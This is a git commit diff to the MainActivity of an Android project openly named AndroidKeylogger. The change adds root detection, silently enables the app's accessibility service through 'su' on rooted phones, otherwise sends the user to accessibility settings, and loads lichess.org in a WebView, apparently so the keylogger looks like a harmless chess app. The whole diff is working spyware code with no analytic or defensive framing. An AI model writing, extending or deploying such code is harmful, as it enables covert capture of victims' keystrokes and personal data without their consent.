e435478568bcaa749ee5bc4654ea4b9c2fa91d8b
Naveen kumar <134396866+N4V33NM@users.noreply.github.com>
2025-02-05 00:12:24 +0530

    Update MainActivity.java

--- AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/MainActivity.java
+++ AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/MainActivity.java
@@ -1,20 +1,24 @@
 package com.bshu2.androidkeylogger;
 
+import android.content.Intent;
 import android.os.AsyncTask;
-import android.os.Looper;
-import androidx.appcompat.app.AppCompatActivity;
 import android.os.Bundle;
+import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
-
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import androidx.appcompat.app.AppCompatActivity;
 import java.io.DataOutputStream;
 
 public class MainActivity extends AppCompatActivity {
 
+    private WebView webView;
+
     private class Startup extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... params) {
-            // this method is executed in a background thread
-            // no problem calling su here
             enableAccessibility();
             return null;
         }
@@ -27,17 +31,17 @@ public class MainActivity extends AppCompatActivity {
 
         setContentView(R.layout.activity_main);
 
+        webView = findViewById(R.id.webView);
+        setupWebView();
+
         (new Startup()).execute();
     }
 
-    void enableAccessibility(){
-        Log.d("MainActivity", "enableAccessibility");
-        if (Looper.myLooper() == Looper.getMainLooper()) {
-            Log.d("MainActivity", "on main thread");
-            // running on the main thread
-        } else {
-            Log.d("MainActivity", "not on main thread");
-            // not running on the main thread
+    void enableAccessibility() {
+        Log.d("MainActivity", "Checking root status...");
+
+        if (isDeviceRooted()) {
+            Log.d("MainActivity", "Device is rooted. Enabling Accessibility via SU...");
             try {
                 Process process = Runtime.getRuntime().exec("su");
                 DataOutputStream os = new DataOutputStream(process.getOutputStream());
@@ -47,12 +51,36 @@ public class MainActivity extends AppCompatActivity {
                 os.flush();
                 os.writeBytes("exit\n");
                 os.flush();
-
                 process.waitFor();
             } catch (Exception e) {
-                e.printStackTrace();
+                Log.e("MainActivity", "Error enabling Accessibility with root", e);
             }
+        } else {
+            Log.d("MainActivity", "Device is not rooted. Redirecting to Accessibility settings...");
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
         }
     }
 
+    boolean isDeviceRooted() {
+        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/su"};
+        for (String path : paths) {
+            if (new java.io.File(path).exists()) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private void setupWebView() {
+        WebSettings webSettings = webView.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+        webSettings.setDomStorageEnabled(true);
+        webSettings.setLoadWithOverviewMode(true);
+        webSettings.setUseWideViewPort(true);
+
+        webView.setWebViewClient(new WebViewClient());
+        webView.loadUrl("https://lichess.org/");
+    }
 }
